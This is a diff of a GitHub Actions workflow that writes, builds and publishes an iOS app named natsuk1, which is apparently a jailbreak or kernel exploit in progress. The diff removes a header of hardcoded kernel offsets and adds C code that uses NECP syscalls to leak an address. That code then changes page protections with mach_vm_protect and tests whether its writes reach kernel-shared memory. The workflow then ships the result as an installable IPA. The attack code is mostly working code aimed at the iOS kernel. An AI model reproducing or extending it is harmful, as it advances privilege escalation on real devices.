@@ -31,62 +31,6 @@ jobs:
           rm -f .github/workflows/fix_and_test.yml
           rm -f natsuk1/Views/SimpleList.swift
 
-      - name: Write nk_offsets.h
-        run: |
-          cat > natsuk1/Exploit/nk_offsets.h <<'NKOFF_EOF'
-          #ifndef NK_OFFSETS_H
-          #define NK_OFFSETS_H
-          #define NK_KERNEL_BASE                0xFFFFFFF007004000ULL
-          #define NK_SYSENT_BASE                0xFFFFFFF007C192A0ULL
-          #define NK_SYSENT_COUNT               558
-          #define NK_SLIDE_FALLBACK             0x3D00000ULL
-          #define NK_NECP_OPEN                  0xFFFFFFF00A4E411CULL
-          #define NK_NECP_CLIENT_ACTION         0xFFFFFFF00A4E5C28ULL
-          #define NK_NECP_ADD_CLIENT            0xFFFFFFF00A4E60DCULL
-          #define NK_NECP_REMOVE_CLIENT         0xFFFFFFF00A4E76F4ULL
-          #define NK_NECP_COPY_RESULT           0xFFFFFFF00A4E7BE8ULL
-          #define NK_NECP_COPY_RESULT_INNER     0xFFFFFFF00A4F26F0ULL
-          #define NK_NECP_COPY_LIST             0xFFFFFFF00A4E80FCULL
-          #define NK_NECP_ADD_FLOW              0xFFFFFFF00A4E843CULL
-          #define NK_NECP_REMOVE_FLOW           0xFFFFFFF00A4E93C4ULL
-          #define NK_NECP_COPY_INTERFACE        0xFFFFFFF00A4EAC7CULL
-          #define NK_NECP_SYSCTL_ARENA          0xFFFFFFF00A4EB704ULL
-          #define NK_NECP_COPY_UPDATE           0xFFFFFFF00A4EC264ULL
-          #define NK_NECP_GET_TLV_AT_OFFSET     0xFFFFFFF00A4C2034ULL
-          #define NK_NECP_OP_ADD_CLIENT         0x01
-          #define NK_NECP_OP_REMOVE_CLIENT      0x02
-          #define NK_NECP_OP_COPY_RESULT        0x03
-          #define NK_NECP_OP_COPY_RESULT_ALT    0x04
-          #define NK_NECP_OP_COPY_LIST          0x05
-          #define NK_NECP_OP_REQUEST_NEXUS      0x06
-          #define NK_NECP_OP_AGENT_ACTION       0x07
-          #define NK_NECP_OP_COPY_AGENT         0x08
-          #define NK_NECP_OP_COPY_INTERFACE     0x09
-          #define NK_NECP_OP_COPY_ROUTE_STATS   0x0B
-          #define NK_NECP_OP_COPY_PARAMETERS    0x0C
-          #define NK_NECP_OP_SYSCTL_ARENA       0x0D
-          #define NK_NECP_OP_UPDATE_CACHE       0x0E
-          #define NK_NECP_OP_COPY_UPDATE        0x0F
-          #define NK_NECP_OP_COPY_RESULT_LONG   0x10
-          #define NK_NECP_OP_ADD_FLOW           0x11
-          #define NK_NECP_OP_REMOVE_FLOW        0x12
-          #define NK_NECP_OP_CLAIM              0x13
-          #define NK_NECP_OP_SIGN               0x14
-          #define NK_NECP_OP_GET_IFACE_ADDR     0x15
-          #define NK_NECP_OP_COPY_AGENT_ALT     0x16
-          #define NK_NECP_OP_VALIDATE           0x17
-          #define NK_NECP_OP_GET_SIGNED_ID      0x18
-          #define NK_NECP_OP_SET_SIGNED_ID      0x19
-          #define NK_NECP_OP_COPY_RESULT_LONG2  0x1A
-          #define NK_NECP_OP_GET_FLOW_STATS     0x1B
-          #define NK_FN_COPYIN                  0xFFFFFFF00A368EC0ULL
-          #define NK_FN_COPYOUT                 0xFFFFFFF00A369A3CULL
-          #define NK_FN_KALLOC_TYPE             0xFFFFFFF00A200988ULL
-          #define NK_FN_KFREE_TYPE              0xFFFFFFF00A201000ULL
-          #define NK_KALLOC_TYPE_NECP_FLOW      0xFFFFFFF007C62E68ULL
-          #endif
-          NKOFF_EOF
-
       - name: Write necp.c
         run: |
           cat > natsuk1/Exploit/necp.c <<'NECP_EOF'
@@ -138,14 +82,6 @@ jobs:
               uint8_t p[1] = {0};
               return (int)syscall(SYS_NECP_ACTION, fd, 0x01, uuid, (size_t)16, p, (size_t)1);
           }
-          static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
-              uint8_t req[56]; memset(req, 0, sizeof(req));
-              memcpy(req + 0x10, cu, 16);
-              *(uint16_t*)(req + 0x20) = 0x0040;
-              int r = (int)syscall(SYS_NECP_ACTION, fd, 0x11, (void*)cu, (size_t)16, req, (size_t)56);
-              if (r == 0) { memcpy(fu, req, 16); fu[9] |= 0x01; }
-              return r;
-          }
           static int nleak_kva(int fd, uint64_t *out) {
               return (int)syscall(SYS_NECP_ACTION, fd, 0x0D, (void*)0, (size_t)0, (void*)out, (size_t)8);
           }
@@ -167,119 +103,132 @@ jobs:
               }
               return found;
           }
-          static int step_protect(uint64_t uva) {
-              nk_log(""); LI("S1", "mach_vm_protect on 0x%llx", (unsigned long long)uva);
-              mach_port_t task = mach_task_self();
-              uint8_t before[64]; memset(before, 0, sizeof(before));
-              mach_vm_size_t outsz = 0;
-              kern_return_t kr = mach_vm_read_overwrite(task, uva, sizeof(before), (mach_vm_address_t)(uintptr_t)before, &outsz);
-              LI("S1", "read before kr=%d", kr);
-              if (kr != KERN_SUCCESS) return -1;
-              uint64_t marker = 0xdeadbeefcafebabeULL;
-              kr = mach_vm_write(task, uva, (vm_offset_t)(uintptr_t)&marker, 8);
-              LI("S1", "vm_write raw kr=%d", kr);
-              vm_address_t page = (vm_address_t)uva & ~0xfffULL;
-              kr = mach_vm_protect(task, page, 0x4000, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
-              LI("S1", "vm_protect RW_COPY kr=%d", kr);
-              kr = mach_vm_write(task, uva, (vm_offset_t)(uintptr_t)&marker, 8);
-              LI("S1", "vm_write after RW_COPY kr=%d", kr);
-              kr = mach_vm_protect(task, page, 0x4000, FALSE, VM_PROT_READ | VM_PROT_WRITE);
-              LI("S1", "vm_protect RW kr=%d", kr);
-              kr = mach_vm_write(task, uva, (vm_offset_t)(uintptr_t)&marker, 8);
-              LI("S1", "vm_write after RW kr=%d", kr);
-              uint8_t after[64]; memset(after, 0, sizeof(after));
-              outsz = 0;
-              kr = mach_vm_read_overwrite(task, uva, sizeof(after), (mach_vm_address_t)(uintptr_t)after, &outsz);
-              int changed = 0;
-              for (int i = 0; i < 64; i++) if (before[i] != after[i]) changed++;
-              LI("S1", "bytes changed: %d", changed);
-              if (changed > 0) LO("S1", "ARENA WRITE POSSIBLE");
+          static kern_return_t rd(mach_vm_address_t a, void *b, size_t n, mach_vm_size_t *o) {
+              return mach_vm_read_overwrite(mach_task_self(), a, n, (mach_vm_address_t)(uintptr_t)b, o);
+          }
+          static kern_return_t wr(mach_vm_address_t a, const void *b, size_t n) {
+              return mach_vm_write(mach_task_self(), a, (vm_offset_t)(uintptr_t)b, (mach_msg_type_number_t)n);
+          }
+          static kern_return_t prot(mach_vm_address_t a, size_t n, vm_prot_t p) {
+              return mach_vm_protect(mach_task_self(), a & ~0xfffULL, n, FALSE, p);
+          }
+          static int step_shared_test(void) {
+              nk_log("");
+              LI("S1", "shared-mapping test: write via A, read via B");
+              int fdA = nfd();
+              int fdB = nfd();
+              if (fdA < 0 || fdB < 0) { LE("S1", "open errno=%d", errno); return -1; }
+              uint8_t cuA[16]; memset(cuA, 0, sizeof(cuA));
+              uint8_t cuB[16]; memset(cuB, 0, sizeof(cuB));
+              if (nadd_client(fdA, cuA) != 0) { close(fdA); close(fdB); return -1; }
+              if (nadd_client(fdB, cuB) != 0) { close(fdA); close(fdB); return -1; }
+              uint64_t uvaA = 0, uvaB = 0;
+              nleak_kva(fdA, &uvaA);
+              nleak_kva(fdB, &uvaB);
+              LI("S1", "uvaA=0x%llx uvaB=0x%llx same=%d",
+                 (unsigned long long)uvaA, (unsigned long long)uvaB,
+                 uvaA == uvaB ? 1 : 0);
+
+              uint8_t snapA[512]; memset(snapA, 0, sizeof(snapA));
+              mach_vm_size_t got = 0;
+              kern_return_t kr = rd((mach_vm_address_t)uvaA, snapA, sizeof(snapA), &got);
+              LI("S1", "snapshot via A kr=%d got=%llu", kr, (unsigned long long)got);
+              LI("S1", "before (A):");
+              hexdump("S1B", snapA, 512, 512);
+
+              kr = prot((mach_vm_address_t)uvaA, 0x4000,
+                        VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
+              LI("S1", "vm_protect(RW_COPY) on A kr=%d", kr);
+              kr = prot((mach_vm_address_t)uvaA, 0x4000,
+                        VM_PROT_READ | VM_PROT_WRITE);
+              LI("S1", "vm_protect(RW) on A kr=%d", kr);
+
+              uint64_t marker = 0xcafebabedeadbeefULL;
+              kr = wr((mach_vm_address_t)(uvaA + 0x100), &marker, 8);
+              LI("S1", "write marker via A kr=%d", kr);
+
+              uint8_t snapA2[512]; memset(snapA2, 0, sizeof(snapA2));
+              kr = rd((mach_vm_address_t)uvaA, snapA2, sizeof(snapA2), &got);
+              LI("S1", "re-read via A kr=%d", kr);
+              uint64_t checkA = 0;
+              memcpy(&checkA, snapA2 + 0x100, 8);
+              LI("S1", "A sees at +0x100: 0x%llx", (unsigned long long)checkA);
+
+              uint8_t snapB[512]; memset(snapB, 0, sizeof(snapB));
+              kr = rd((mach_vm_address_t)uvaB, snapB, sizeof(snapB), &got);
+              LI("S1", "read via B kr=%d", kr);
+              uint64_t checkB = 0;
+              memcpy(&checkB, snapB + 0x100, 8);
+              LI("S1", "B sees at +0x100: 0x%llx", (unsigned long long)checkB);
+
+              if (checkA == marker && checkB == marker) {
+                  LO("S1", "SHARED MAPPING CONFIRMED - kernel sees our writes!");
+              } else if (checkA == marker) {
+                  LW("S1", "COW copy - A sees marker, B does not (kernel does not)");
+              } else {
+                  LW("S1", "write did not stick");
+              }
+
+              close(fdA);
+              close(fdB);
               return 0;
           }
-          static int step_copy_list(void) {
-              nk_log(""); LI("S2", "op=0x05 copy_list");
+          static int step_arena_dump(void) {
+              nk_log("");
+              LI("S2", "full arena dump via mach_vm_read");
               int fd = nfd();
               if (fd < 0) { LE("S2", "open errno=%d", errno); return -1; }
               uint8_t cu[16]; memset(cu, 0, sizeof(cu));
               if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
-              uint8_t fu[16]; nadd_flow(fd, cu, fu);
-              uint8_t buf[RESBUF]; memset(buf, 0, sizeof(buf));
-              int c = (int)syscall(SYS_NECP_ACTION, fd, 0x05, (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
-              LI("S2", "returned %d", c);
+              uint64_t uva = 0;
+              nleak_kva(fd, &uva);
               close(fd);
-              if (c > 0) {
-                  hexdump("S2H", buf, c, 512);
-                  int nk = scan_kptr("S2K", buf, c);
-                  LI("S2", "kptr count = %d", nk);
-              }
-              return c;
+              LI("S2", "uva=0x%llx", (unsigned long long)uva);
+
+              uint8_t big[512]; memset(big, 0, sizeof(big));
+              mach_vm_size_t got = 0;
+              kern_return_t kr = rd((mach_vm_address_t)uva, big, sizeof(big), &got);
+              LI("S2", "kr=%d got=%llu", kr, (unsigned long long)got);
+              hexdump("S2H", big, 512, 512);
+              return 0;
           }
           static int step_copy_interface(void) {
-              nk_log(""); LI("S3", "op=0x09 copy_interface idx 1..10");
+              nk_log("");
+              LI("S3", "op=0x09 copy_interface idx 1..5 with hexdump");
               int fd = nfd();
               if (fd < 0) { LE("S3", "open errno=%d", errno); return -1; }
               uint8_t cu[16]; memset(cu, 0, sizeof(cu));
               if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
-              for (uint32_t idx = 1; idx <= 10; idx++) {
+              for (uint32_t idx = 1; idx <= 5; idx++) {
                   uint8_t ibuf[4]; memcpy(ibuf, &idx, 4);
                   uint8_t buf[256]; memset(buf, 0, sizeof(buf));
-                  int c = (int)syscall(SYS_NECP_ACTION, fd, 0x09, (void*)ibuf, (size_t)4, buf, (size_t)0x74);
+                  int c = (int)syscall(SYS_NECP_ACTION, fd, 0x09,
+                                       (void*)ibuf, (size_t)4, buf, (size_t)0x74);
+                  LI("S3", "idx=%u ret=%d", idx, c);
                   if (c > 0) {
-                      LI("S3", "idx=%u ret=%d", idx, c);
                       hexdump("S3H", buf, c, 0x74);
                       int nk = scan_kptr("S3K", buf, c);
                       LI("S3", "  kptr count = %d", nk);
-                  } else {
-                      LI("S3", "idx=%u ret=%d", idx, c);
                   }
               }
               close(fd);
               return 0;
           }
-          static int step_arena_full(uint64_t uva) {
-              nk_log(""); LI("S4", "arena 0x%llx full", (unsigned long long)uva);
-              mach_port_t task = mach_task_self();
-              vm_address_t a = (vm_address_t)uva;
-              vm_size_t size = 0;
-              vm_region_basic_info_data_64_t info;
-              mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
-              mach_port_t obj = MACH_PORT_NULL;
-              kern_return_t kr = vm_region_64(task, &a, &size, VM_REGION_BASIC_INFO_64, (vm_region_info_t)&info, &cnt, &obj);
-              LI("S4", "vm_region kr=%d size=0x%llx prot=%d", kr, (unsigned long long)size, info.protection);
-              if (kr == KERN_SUCCESS && size > 0 && size < 0x100000) {
-                  static uint8_t big[65536]; memset(big, 0, sizeof(big));
-                  mach_vm_size_t got = 0;
-                  vm_size_t req = size < sizeof(big) ? size : sizeof(big);
-                  kr = mach_vm_read_overwrite(task, uva, req, (mach_vm_address_t)(uintptr_t)big, &got);
-                  LI("S4", "read kr=%d got=%llu", kr, (unsigned long long)got);
-                  int nk = scan_kptr("S4K", big, (int)got);
-                  LI("S4", "kptr count = %d", nk);
-                  int lastnz = 0;
-                  for (int i = 0; i < (int)got; i++) if (big[i] != 0) lastnz = i;
-                  LI("S4", "last nonzero off: 0x%x", lastnz);
-              }
-              return 0;
-          }
           static int impl(void) {
-              nk_log(""); nk_log("================================================================");
-              nk_log("natsuk1 v5.0 - NECP post-arena");
+              nk_log("");
+              nk_log("================================================================");
+              nk_log("natsuk1 v5.1 - NECP arena shared-write test");
               nk_log("================================================================");
               nk_log("");
               int fd = nfd();
               if (fd < 0) { LE("PRE", "necp_open errno=%d", errno); return 1; }
               close(fd);
               LO("PRE", "necp_open OK");
-              int fd2 = nfd();
-              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-              if (nadd_client(fd2, cu) == 0) {
-                  uint64_t uva = 0;
-                  int rc = nleak_kva(fd2, &uva);
-                  if (rc == 0) { step_arena_full(uva); step_protect(uva); }
-              }
-              close(fd2);
-              step_copy_list();
+              step_arena_dump();
+              step_shared_test();
               step_copy_interface();
-              nk_log(""); nk_log("======== done ========");
+              nk_log("");
+              nk_log("======== done ========");
               return 0;
           }
           int nk_necp_run(void) {
@@ -291,175 +240,6 @@ jobs:
           }
           void nk_necp_cancel(void) { g_cancel = 1; nk_log("[!] cancel requested"); }
           NECP_EOF
-
-      - name: Write natsuk1.swift
-        run: |
-          cat > natsuk1/natsuk1.swift <<'SWIFT_EOF'
-          import SwiftUI
-          import UIKit
-          import Foundation
-          final class LockedBuffer: @unchecked Sendable {
-              nonisolated(unsafe) static let shared = LockedBuffer()
-              private let lock = NSLock()
-              private var value: String = ""
-              private init() {}
-              func append(_ s: String) {
-                  lock.lock(); value += s + "\n"
-                  if value.count > 10000 { value = String(value.suffix(6000)) }
-                  lock.unlock()
-              }
-              func drain() -> String { lock.lock(); let v = value; value = ""; lock.unlock(); return v }
-              func clear() { lock.lock(); value = ""; lock.unlock() }
-          }
-          private let cCallback: @convention(c) (UnsafePointer<CChar>?) -> Void = { line in
-              guard let line = line else { return }
-              var bytes: [UInt8] = []
-              var p = line
-              while p.pointee != 0 { bytes.append(UInt8(bitPattern: p.pointee)); p = p.advanced(by: 1) }
-              let _line = String(decoding: bytes, as: UTF8.self)
-              LockedBuffer.shared.append(_line)
-              CrashLog.shared.writeLine(_line)
-              AppState.shared.parseLogLine(_line)
-          }
-          private func osVersionString() -> String {
-              let v = ProcessInfo.processInfo.operatingSystemVersion
-              return "\(v.majorVersion).\(v.minorVersion)"
-          }
-          private func appVersionString() -> String {
-              Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.0"
-          }
-          @main
-          struct natsuk1App: App { var body: some Scene { WindowGroup { RootView() } } }
-          struct RootView: View {
-              @StateObject private var state = AppState.shared
-              @StateObject private var offsets = OffsetsStore.shared
-              @StateObject private var airlift = AirliftBridge.shared
-              @AppStorage("auto_run") private var auto_run = false
-              @AppStorage("keep_alive_audio") private var keep_alive_audio = false
-              @AppStorage("keep_alive_location") private var keep_alive_location = false
-              @Environment(\.scenePhase) private var scenePhase
-              init() {
-                  UserDefaults.standard.register(defaults: ["auto_run": false, "keep_alive_audio": false, "keep_alive_location": false, "lang": "en"])
-              }
-              var body: some View {
-                  ContentView()
-                      .environmentObject(state).environmentObject(offsets).environmentObject(airlift)
-                      .onAppear {
-                          CrashLog.shared.install()
-                          if let prev = CrashLog.shared.recoverPreviousSession(), !prev.isEmpty { AppState.shared.previousCrash = prev }
-                          nk_set_log(cCallback)
-                          if state.log.isEmpty {
-                              state.append("[*] natsuk1 v\(appVersionString())")
-                              state.append("[*] iOS \(osVersionString()) / arm64e")
-                              state.append("")
-                          }
-                          if keep_alive_audio { KeepAlive.shared.startAudio() }
-                          if keep_alive_location { KeepAlive.shared.startLocation() }
-                          if auto_run { DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { state.run() } }
-                      }
-                      .onChange(of: keep_alive_audio) { _, v in if v { KeepAlive.shared.startAudio() } else { KeepAlive.shared.stopAudio() } }
-                      .onChange(of: keep_alive_location) { _, v in if v { KeepAlive.shared.startLocation() } else { KeepAlive.shared.stopLocation() } }
-                      .onChange(of: scenePhase) { _, phase in if phase == .background { CrashLog.shared.markCleanShutdown() } }
-              }
-          }
-          final class AppState: ObservableObject, @unchecked Sendable {
-              nonisolated(unsafe) static let shared = AppState()
-              @Published var slide: String = "-"
-              @Published var base: String = "-"
-              @Published var previousCrash: String? = nil
-              @Published var showCrashLog: Bool = false
-              func parseLogLine(_ line: String) {
-                  if let v = Self.extractHex(line, keys: ["slide=0x", "SLIDE = 0x", "slide = 0x"]) {
-                      if self.slide != v { DispatchQueue.main.async { self.slide = v } }
-                  }
-                  if let v = Self.extractHex(line, keys: ["base=0x", "BASE = 0x", "base = 0x"]) {
-                      if self.base != v { DispatchQueue.main.async { self.base = v } }
-                  }
-              }
-              private static func extractHex(_ s: String, keys: [String]) -> String? {
-                  for k in keys {
-                      if let r = s.range(of: k) {
-                          var hex = ""
-                          for c in s[r.upperBound...] { if c.isHexDigit { hex.append(c) } else { break } }
-                          if !hex.isEmpty { return "0x" + hex }
-                      }
-                  }
-                  return nil
-              }
-              enum Status {
-                  case idle, running, ok, failed
-                  var color: Color {
-                      switch self {
-                      case .idle: return .secondary
-                      case .running: return .orange
-                      case .ok: return .green
-                      case .failed: return .red
-                      }
-                  }
-              }
-              @Published var log: String = ""
-              @Published var status: Status = .idle
-              @Published var running: Bool = false
-              @Published var show_respring: Bool = false
-              @Published var lang: String { didSet { UserDefaults.standard.set(lang, forKey: "lang") } }
-              private var flusher: Timer?
-              private init() {
-                  self.lang = UserDefaults.standard.string(forKey: "lang") ?? "en"
-                  startFlusher()
-              }
-              func t(_ en: String, _ ru: String) -> String { lang == "ru" ? ru : en }
-              private func startFlusher() {
-                  flusher?.invalidate()
-                  flusher = Timer.scheduledTimer(withTimeInterval: 0.3, repeats: true) { [weak self] _ in
-                      guard let self = self else { return }
-                      let chunk = LockedBuffer.shared.drain()
-                      if chunk.isEmpty { return }
-                      var newLog = self.log
-                      newLog += chunk
-                      if newLog.count > 30000 { newLog = String(newLog.suffix(20000)) }
-                      self.log = newLog
-                  }
-              }
-              func append(_ s: String) { LockedBuffer.shared.append(s) }
-              func run() {
-                  if running { return }
-                  running = true; status = .running
-                  Task.detached {
-                      _ = nk_full_exploit()
-                      await MainActor.run {
-                          AppState.shared.running = false
-                          AppState.shared.status = .ok
-                      }
-                  }
-              }
-              func necp_run() {
-                  if running { return }
-                  running = true; status = .running
-                  Task.detached {
-                      let rc = nk_necp_run()
-                      await MainActor.run {
-                          AppState.shared.running = false
-                          AppState.shared.status = (rc == 0) ? .ok : .failed
-                      }
-                  }
-              }
-              func respring() {
-                  DispatchQueue.main.async {
-                      guard let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
-                            let window = scene.windows.first(where: { $0.isKeyWindow }) ?? scene.windows.first,
-                            let root = window.rootViewController else { return }
-                      let host = UIHostingController(rootView: RespringView().ignoresSafeArea())
-                      host.modalPresentationStyle = .fullScreen
-                      root.present(host, animated: false)
-                  }
-              }
-              func clear() { LockedBuffer.shared.clear(); log = "" }
-              func cancel() {
-                  nk_necp_cancel()
-                  append("[*] cancel requested")
-              }
-          }
-          SWIFT_EOF
 
       - name: Install tools
         run: |
@@ -473,22 +253,14 @@ jobs:
         run: |
           set -euo pipefail
           xcodebuild \
-            -project natsuk1.xcodeproj \
-            -scheme natsuk1 \
-            -configuration Release \
-            -sdk iphoneos \
-            -destination 'generic/platform=iOS' \
-            -derivedDataPath build \
-            -parallelizeTargets \
-            -jobs "$(sysctl -n hw.ncpu)" \
-            CODE_SIGNING_ALLOWED=NO \
-            SWIFT_VERSION=5.0 \
-            SWIFT_STRICT_CONCURRENCY=minimal \
+            -project natsuk1.xcodeproj -scheme natsuk1 -configuration Release \
+            -sdk iphoneos -destination 'generic/platform=iOS' \
+            -derivedDataPath build -parallelizeTargets -jobs "$(sysctl -n hw.ncpu)" \
+            CODE_SIGNING_ALLOWED=NO SWIFT_VERSION=5.0 SWIFT_STRICT_CONCURRENCY=minimal \
             SWIFT_APPROACHABLE_CONCURRENCY=NO \
             SWIFT_UPCOMING_FEATURE_NONISOLATED_NONSENDING_BY_DEFAULT=NO \
             OTHER_SWIFT_FLAGS="-Xfrontend -disable-dynamic-actor-isolation -Xfrontend -disable-actor-data-race-checks" \
-            -UseModernBuildSystem=YES \
-            build -quiet
+            -UseModernBuildSystem=YES build -quiet
 
       - name: Package and Release
         env:
@@ -496,10 +268,7 @@ jobs:
         run: |
           set -euo pipefail
           APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
-          if [ -z "$APP_PATH" ]; then
-            echo "no .app"
-            exit 1
-          fi
+          if [ -z "$APP_PATH" ]; then echo "no .app"; exit 1; fi
           ldid -Snatsuk1/Resources/natsuk1.entitlements "$APP_PATH/natsuk1"
           rm -rf Payload natsuk1.ipa
           mkdir -p Payload
@@ -511,7 +280,7 @@ jobs:
           fi
           REPO="${{ github.repository }}"
           IPA_URL="https://github.com/${REPO}/releases/download/development/natsuk1.ipa"
-          NOTES="natsuk1 v5.0 dev
+          NOTES="natsuk1 v5.1
 
           IPA: ${IPA_URL}
           AltStore: altstore://install?url=${IPA_URL}
@@ -521,7 +290,5 @@ jobs:
           $(git log -5 --pretty=format:'- %h %s')"
           gh release create development natsuk1.ipa \
             --target "${{ github.sha }}" \
-            --title "Development" \
-            --prerelease \
-            --latest=false \
+            --title "Development" --prerelease --latest=false \
             --notes "$NOTES"
